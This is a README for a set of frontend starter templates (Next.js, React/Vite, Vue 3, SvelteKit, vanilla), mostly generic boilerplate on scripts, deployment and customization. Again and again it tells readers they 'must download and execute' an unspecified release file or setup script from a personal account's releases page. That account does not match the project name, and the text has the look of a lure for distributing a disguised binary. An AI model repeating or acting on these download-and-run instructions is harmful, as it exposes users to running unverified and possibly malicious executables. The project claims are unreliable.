# Jirehgrp Frontend Templates — Next.js, Vite, Vue, SvelteKit

[![Releases](https://img.shields.io/badge/Releases-vLATEST-blue?style=for-the-badge&logo=github)](https://github.com/Sadhana2203/jirehgrp-templates/releases)  
https://github.com/Sadhana2203/jirehgrp-templates/releases

A set of official frontend starter templates for create-jireh. ለ create-jireh ይፋዊ የፊት-መጨረሻ ማስጀመሪያ ቴምፕሌቶች ናቸው። Next.js, React, Vite, Vue 3, SvelteKit እና ሌሎች ተጨማሪዎችን በ JS እና TS ቋንቋዎች ይደግፋል።

Badges
- [![Next.js](https://img.shields.io/badge/Next.js-black?style=flat-square&logo=next.js)](https://nextjs.org)
- [![React](https://img.shields.io/badge/React-61DAFB?style=flat-square&logo=react&logoColor=black)](https://react.dev)
- [![Vite](https://img.shields.io/badge/Vite-646CFF?style=flat-square&logo=vite&logoColor=white)](https://vitejs.dev)
- [![Vue 3](https://img.shields.io/badge/Vue-35495E?style=flat-square&logo=vue.js&logoColor=4FC08D)](https://vuejs.org)
- [![SvelteKit](https://img.shields.io/badge/SvelteKit-FF3E00?style=flat-square&logo=svelte&logoColor=white)](https://kit.svelte.dev)
- Topics: amharic, nextjs, nextjs15, react, react-ts, react-vite, sveltekit, vanilla-javascript, vanilla-typescript, vue, vue3, vue3-ts

Table of contents
- About
- Why use these templates
- Templates included
- Quick start
- CLI: create-jireh integration
- Per-template guides
  - Next.js (React)
  - React (Vite)
  - Vue 3 (Vite)
  - SvelteKit
  - Vanilla JS / TS
- Project structure and common patterns
- Scripts and automation
- TypeScript vs JavaScript notes
- Testing and quality
- Deployment guides
  - Vercel
  - Netlify
  - Cloudflare Pages
  - Static hosting
- Example setups
- Customization guide
- Contributing
- Releases and changelog
- License
- Maintainers
- FAQ
- Troubleshooting

About
These templates serve teams and solo developers who need a solid, consistent start for frontend work. Each template pairs a solid build setup with common app patterns. The set covers modern frameworks and build tools. You get ready-to-run projects that include routing, state basics, styling options, and recommended scripts.

Why use these templates
- Save time. Start with a scaffold that includes routing, demo pages, and build scripts.
- Consistent patterns. Each template follows similar folder layout and naming.
- Cross-framework parity. You can move ideas from one framework to another without redesign.
- JS and TS flavors. Start in JavaScript or TypeScript without extra setup.

Templates included
Each template exists in JS and TS flavors when relevant.

- nextjs (React)
  - nextjs-js
  - nextjs-ts
- react-vite
  - react-vite-js
  - react-vite-ts
- vue3-vite
  - vue3-js
  - vue3-ts
- sveltekit
  - sveltekit-js
  - sveltekit-ts
- vanilla
  - vanilla-js
  - vanilla-ts

Quick start
1. Visit the Releases page and download the release asset. The release contains ready archives and CLI bundles. You must download and execute the release file from the page: https://github.com/Sadhana2203/jirehgrp-templates/releases  
2. Unpack the archive for the template you want.
3. Install dependencies and run.

Example (manual download flow)
- Download create-jireh-templates-v1.2.0.zip from https://github.com/Sadhana2203/jirehgrp-templates/releases
- Unzip
- cd react-vite-js
- npm install
- npm run dev

If you prefer the CLI flow, see the CLI section below. The releases page hosts the CLI binary and the template bundles. Download the correct asset and run the included setup script.

CLI: create-jireh integration
The templates plug into create-jireh. The release includes a small installer you can run to scaffold projects from a central list.

Install via releases (example)
- Download the release asset that matches your platform. The asset will be named like create-jireh-cli-v1.2.0-linux or create-jireh-cli-v1.2.0-win.exe in the releases page.
- Place the binary in your PATH or run it from the folder.
- Example: ./create-jireh-cli --template react-vite-ts --name my-app

Installer basics
- The release bundle contains a small CLI and a set of offline templates. You must download and execute the file from the releases page to run the installer.
- The installer asks for:
  - template choice
  - language (JS / TS)
  - package manager
  - basic options (use-tailwind, use-eslint, use-prettier)
- The installer creates a folder and writes a ready-to-run project.

Per-template guides
Each template uses shared patterns. These sections describe specifics.

Next.js (React)
Overview
- Framework: Next.js (v15 compatibility tags available)
- Mode: Full-stack pages and app router support
- Flavors: JS and TS
- Key features in templates:
  - App router demo (if enabled)
  - API route example
  - SSR and SSG examples
  - Styling: CSS Modules and optional Tailwind
  - ESLint and Prettier presets

Files of note
- /app (or /pages) - demo routes and layout
- /api - example API endpoint
- next.config.js - base config
- tsconfig.json - TypeScript config (TS flavor)
- package.json - scripts: dev, build, start, lint

Commands
- npm run dev
- npm run build
- npm run start
- npm run lint
- npm run typecheck (TS)

Best practices
- Use the app router for new layouts.
- Keep API logic minimal in templates; move complex logic to services.
- Use environment variables for secrets and build-time switches.

React (Vite)
Overview
- Framework: React with Vite
- Flavors: JS and TS
- Key features:
  - Fast dev server with HMR
  - Routing via React Router (example)
  - State example via React context
  - Optional Tailwind config

Files of note
- /src/main.jsx | main.tsx
- /src/App.jsx | App.tsx
- /src/pages - demo pages
- vite.config.js - Vite config

Commands
- npm run dev
- npm run build
- npm run preview
- npm run lint

Best practices
- Use React Router for predictable routing.
- Keep assets under /public or /src/assets.
- Use code-splitting for heavy routes and components.

Vue 3 (Vite)
Overview
- Framework: Vue 3 with Vite
- Flavors: JS and TS (SFC with <script setup>)
- Key features:
  - Router example with vue-router
  - Pinia store demo
  - SFC patterns with composables
  - Optional Tailwind

Files of note
- /src/main.js | main.ts
- /src/App.vue
- /src/router
- /src/store (Pinia)

Commands
- npm run dev
- npm run build
- npm run preview

Best practices
- Use composables to share logic.
- Use Pinia for central state; keep components small and focused.

SvelteKit
Overview
- Framework: SvelteKit
- Flavors: JS and TS
- Key features:
  - File-based routing
  - Server endpoints for API
  - Layouts and page-level load functions
  - Styling with Svelte scope

Files of note
- /src/routes
- /src/lib
- svelte.config.js
- package.json

Commands
- npm run dev
- npm run build
- npm run preview

Best practices
- Use stores for cross-component state.
- Use +page.server for server-side logic and +page for client loads.

Vanilla JS / TS
Overview
- Minimal build using Vite
- Good for micro frontends and static widgets
- Includes bundling, live reload, and example deployment

Files of note
- /src/index.js | index.ts
- /index.html
- vite.config.js

Commands
- npm run dev
- npm run build
- npm run preview

Project structure and common patterns
All templates share a common folder layout. This structure reduces friction when moving between frameworks.

Common layout
- .github/ - CI and issue templates
- docs/ - docs, examples, and design notes
- scripts/ - helper scripts for setup and deploy
- src/ - source code
- public/ - static files
- package.json - scripts and deps
- README.md - template readme

Patterns
- Feature folders for pages and routes.
- /lib or /utils for shared helpers.
- Atomic components under /components with clear naming.
- Use environment variables and .env.example.

Scripts and automation
Scripts included in package.json
- dev: start the dev server
- build: create production build
- preview: run a preview server
- start: run production server for SSR templates
- lint: run ESLint
- format: run Prettier
- test: run tests (if present)
- analyze: bundle analysis (optional)

Automation tips
- Use pre-commit hooks to run lint and format. The templates include Husky and lint-staged when enabled.
- Use GitHub Actions for CI. The .github/workflows folder contains sample workflows for Node, build, and test steps.

TypeScript vs JavaScript notes
- Both flavors receive the same patterns and structure.
- TS templates include a strict tsconfig, optional path aliases, and basic type examples.
- When migrating from JS to TS, add types incrementally. Start with key modules and gradually add types to avoid large refactors.
- Use type-check script before release to avoid runtime surprises.

Testing and quality
Testing stack
- Unit tests: Vitest or Jest depending on framework
- Component tests: Testing Library for React / Vue / Svelte
- E2E: Playwright sample setup in some templates

Add tests
- npm run test
- npm run test:watch

Linting
- ESLint config with recommended rules per framework
- Prettier for consistent formatting
- Optional rules for TypeScript

Coverage
- Templates include a basic coverage report setup. The config aims for core files and demo code.

Deployment guides
Vercel
- Next.js: Push to Git, connect repo to Vercel. Vercel detects Next.js and sets build and output automatically.
- Vite apps: Set build command to npm run build and output to dist.

Netlify
- Build command: npm run build
- Publish directory: dist (or .vercel/output for certain setups)

Cloudflare Pages
- Build command: npm run build
- Output directory: dist

Static hosting
- Use npm run build and upload /dist to any static host.
- For SPA, set rewrite rules to index.html.

Example setups
Example 1: Next.js app with Tailwind and Vercel
- Start from nextjs-ts
- Enable Tailwind via template flag
- Set environment variables in Vercel dashboard
- Deploy with Vercel CLI or link the repo

Example 2: React Vite app with SSR and Cloudflare Pages
- Use react-vite-ssr variant
- Build with adapter for Cloudflare
- Push to Cloudflare Pages with correct build settings

Customization guide
Theme and styling
- Templates include CSS Modules, global styles, and optional Tailwind. Pick one pattern and keep it consistent.
- For design systems, add a global tokens file and import into components.

Routing and layout
- Use layout components to share headers, footers, and global navigation.
- Keep route-level data fetching near the route.

State management
- For small apps, use built-in state or context.
- For medium apps, use Pinia (Vue), Redux Toolkit (React), or Svelte stores.

Environment variables
- Use .env.example to list keys.
- Use framework-specific env rules. For Next.js prefix with NEXT_PUBLIC_ for client-side variables.

Asset handling
- Keep images in /public for static assets.
- Use import for assets you want bundled and processed.

Contributing
We accept patches, template improvements, bug fixes, and new templates.

How to contribute
- Fork the repository
- Create a branch with a clear name (e.g., feat/vue3-tailwind)
- Run the relevant template locally and test changes
- Open a pull request with a clear description and screenshots where useful

Code style
- Follow existing style in the template you edit.
- Use the included ESLint and Prettier configs.
- Add tests for features and fix any failing tests.

Issue labels
- bug
- enhancement
- docs
- question

Releases and changelog
The Releases page hosts compiled bundles, installer binaries, and changelog notes. You must download and execute the release asset for CLI installs and offline bundles. Download the release file and run its setup script from the releases page: https://github.com/Sadhana2203/jirehgrp-templates/releases

Release naming
- create-jireh-templates-vX.Y.Z.zip — full template archive
- create-jireh-cli-vX.Y.Z-{os} — CLI binary for installer
- template-<name>-vX.Y.Z.zip — single template bundle

Changelog format
- Each release pairs a changelog entry with the assets. The changelog highlights new templates, breaking changes, and migration notes.

License
- MIT license by default. See LICENSE file for full terms.

Maintainers
- Primary maintainer: Jirehgrp templates team
- Contributions come from community members and external contributors
- Maintainers handle review, CI, and release tasks

FAQ
Q: Which template should I pick?
A: Pick the framework you aim to use in production. If you plan SSR, use Next.js or SvelteKit. If you want a fast dev server for SPAs, use Vite templates.

Q: Can I use Tailwind?
A: Yes. Use the template flags or add Tailwind manually. The templates include Tailwind config in selected variants.

Q: Are these templates production-ready?
A: They provide a strong starting point. You still must review security, performance, and environment-specific needs before production.

Q: Do templates support monorepo setups?
A: Yes. The templates keep simple boundaries and should work in monorepo contexts. You might need to adjust path aliases and build scripts for workspaces.

Troubleshooting
Common issues and fixes

1) Dev server fails with port in use
- Kill the running process or change the port in the start command: PORT=3001 npm run dev

2) Node version mismatch
- Use the Node version specified in .nvmrc or engines in package.json. Use nvm or asdf to pin Node.

3) Missing environment variables
- Copy .env.example to .env and add values. Restart the dev server.

4) Type errors in TS templates after upgrade
- Run npm run typecheck and fix top-level errors. Some packages may need @types or updated TS config.

5) Broken CSS or Tailwind
- Ensure postcss.config.js and tailwind.config.js exist and the CSS import appears in the root layout.

Template API and extension points
Each template exposes extension points to help teams adapt common behavior.

- Hooks / composables: Add shared hooks under /src/lib/hooks or /src/composables.
- Component library: /src/components contains base components; extend or replace them.
- Theme tokens: /src/design/tokens holds color and spacing tokens.
- Service layer: /src/services manages backend calls and auth.

Example: Adding a service
1. Create /src/services/apiClient.js
2. Add fetch wrapper with base URL from env
3. Import into pages and use in load or useEffect

Security considerations
- Do not commit secrets. Use .env.local and .gitignore.
- Sanitize user input at API boundaries.
- Use HTTPS and secure headers in production.
- Keep dependencies up to date with automated tools.

CI / CD
- Templates include GitHub Actions examples:
  - build.yml: checks build on push
  - test.yml: runs tests on pull requests
  - publish.yml: deploys releases or publishes package on tags

Sample workflow (build.yml)
- job: install-deps
  - uses: actions/checkout@v3
  - run: npm ci
  - run: npm run build
  - run: npm run test

Monorepo tips
- Use pnpm workspace for fast installs and dedupe.
- Keep template packages separate and reuse shared config via workspace packages.

Examples and demo links
- Each template includes a demo app in the examples folder. Open the demo and run npm install and npm run dev to view.

Code snippets
Scaffold a React Vite app (manual)
```
npx degit jirehgrp-templates/react-vite-js my-app
cd my-app
npm install
npm run dev
```

Start with CLI (after downloading release)
```
# Make CLI executable on Unix
chmod +x create-jireh-cli-linux

# Run installer
./create-jireh-cli --template nextjs-ts --name my-next-app --pm pnpm
```

Add Tailwind to an existing template
```
# Install
npm install -D tailwindcss postcss autoprefixer
npx tailwindcss init -p

# tailwind.config.js
module.exports = {
  content: ['./src/**/*.{js,ts,jsx,tsx,vue,svelte,html}'],
  theme: { extend: {} },
  plugins: [],
}
```

Testing with Vitest (React / Vue)
```
# install
npm install -D vitest @testing-library/react @testing-library/user-event

# run
npm run test
```

Debugging build issues
- Run build locally: NODE_ENV=production npm run build
- Use bundle analyzer: npm run analyze
- Check dependency versions and lockfile (package-lock.json or pnpm-lock.yaml)

Internationalization (i18n)
- Templates include optional i18n examples.
- For Next.js use next-i18next or built-in i18n routing.
- For Vue use vue-i18n.
- For SvelteKit use @sveltejs/adapter and local stores.

Accessibility
- Templates include basic a11y checks.
- Use axe-core or Lighthouse during CI.
- Add aria attributes and semantic HTML components.

Performance
- Use code splitting and lazy load heavy modules.
- Use image optimization strategies for Next.js or third-party libs for other frameworks.
- Use CDN for static assets.

Common patterns for scaling
- Keep domain logic separate from components.
- Use feature folders to group components, routes, and services.
- Add a design system package as your app grows.

Maintaining your fork
- Keep a sync script to pull updates from the upstream repo.
- Rebase or merge upstream changes regularly.
- Test templates after each upstream update.

Changelog highlights (example entries)
- v1.2.0: Add SvelteKit TS variant, improve Next.js app router demo, fix Vite plugin issues.
- v1.1.0: Add Tailwind option to React templates, add GitHub Actions.
- v1.0.0: Initial release with Next.js, React, Vue 3, SvelteKit, Vanilla templates.

Releases page
The releases page contains build assets and the CLI. Download the release asset and run the included setup script or binary. The release file includes a README and a setup script. Visit and download from: https://github.com/Sadhana2203/jirehgrp-templates/releases

License and legal
- MIT license included. See LICENSE file.

Maintainer notes
- We review PRs in order.
- Provide clear issue reproduction steps.
- Include tests when you can.

Thanks for exploring the templates. Use the releases page to get the installer and templates, download the asset, and execute the setup file to get started: https://github.com/Sadhana2203/jirehgrp-templates/releases

Screenshots and images
- Template gallery:
  - Next.js demo: https://img.shields.io/badge/Next.js-demo-black?logo=next.js
  - React Vite demo: https://img.shields.io/badge/React%20(Vite)-demo-61DAFB?logo=react
  - Vue 3 demo: https://img.shields.io/badge/Vue%203-demo-35495E?logo=vue.js
  - SvelteKit demo: https://img.shields.io/badge/SvelteKit-demo-FF3E00?logo=svelte

Contact and support
- Open GitHub issues for bugs or feature requests.
- Create PRs for fixes and improvements.
- Check the releases page for packaged installers and assets: https://github.com/Sadhana2203/jirehgrp-templates/releases

Appendix: checklist before production
- [ ] Remove demo pages
- [ ] Secure environment variables
- [ ] Run type checks and tests
- [ ] Run bundle analysis
- [ ] Add monitoring and error tracking
- [ ] Configure CI / CD

Developer resources
- Next.js docs: https://nextjs.org/docs
- Vite docs: https://vitejs.dev/guide/
- React docs: https://react.dev
- Vue docs: https://vuejs.org/guide/
- SvelteKit docs: https://kit.svelte.dev/docs

End of README content.